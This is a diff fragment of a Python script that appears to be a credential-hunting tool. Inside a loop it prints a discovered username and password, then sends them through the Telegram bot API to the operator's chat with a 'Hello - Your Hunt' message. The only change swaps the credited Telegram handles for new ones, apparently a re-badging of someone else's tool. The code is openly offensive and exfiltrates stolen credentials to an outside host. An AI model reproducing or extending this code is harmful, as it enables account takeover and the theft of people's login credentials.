@@ -66,7 +66,7 @@ while True:
 		print(F+'User name : '+username)
 		print(F+'Password : '+password)
 		tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝑯𝒆𝒍𝒍𝒐 - 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎
-\n- 𝑷𝑯 ➪ {username} ✓\n- 𝑷𝑺 ➪ {password} \n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @FxzzzH -K- @X_X_9T ''')
+\n- 𝑷𝑯 ➪ {username} ✓\n- 𝑷𝑺 ➪ {password} \n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @Engineer302 -K- @EuF302 ''')
 		i = requests.post(tlg)
 		break
 		
